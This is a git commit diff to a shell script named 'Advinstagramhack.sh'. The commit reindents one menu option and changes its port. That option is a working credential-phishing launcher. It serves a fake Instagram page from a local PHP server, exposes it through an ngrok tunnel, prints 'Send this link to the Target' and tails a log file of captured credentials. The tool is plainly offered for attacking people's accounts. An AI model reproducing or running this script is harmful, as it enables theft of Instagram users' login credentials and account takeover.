72149645af91d67eebdfad73f3fbdbe219cffb9a
shravanjerry <66510252+shravanjerry@users.noreply.github.com>
2020-07-04 12:32:49 +0530

    Update Advinstagramhack.sh

--- Advinstagramhack.sh
+++ Advinstagramhack.sh
@@ -49,30 +49,28 @@ echo ""
 read -p $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
 		 case $option in 
 			 
-
-
-1) cd sites/
-cd instagram/
-echo ""
-echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
-php -S 127.0.0.1:2020 > /dev/null 2>&1 &
-sleep 3
-echo ""
-echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
-./ngrok http 2020 > /dev/null 2>&1 &
-sleep 25
-echo ""
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
-echo ""
-echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL // \e[0m'
-echo ""
-tail -f log.txt 
-
-
-
-
-;;
+                1) cd sites/
+                  cd instagram/
+                  echo ""
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                  sleep 3
+                  echo ""
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                  ./ngrok http 4444 > /dev/null 2>&1 &
+                  sleep 25
+                  echo ""
+                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
+                  echo ""
+                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
+                  echo ""
+                  tail -f log.txt  
+                  
+                 
+ 
+                  
+                ;;
 
 99)echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m >> THANKS FOR JOIN US >> \e[0m'
 sleep 1
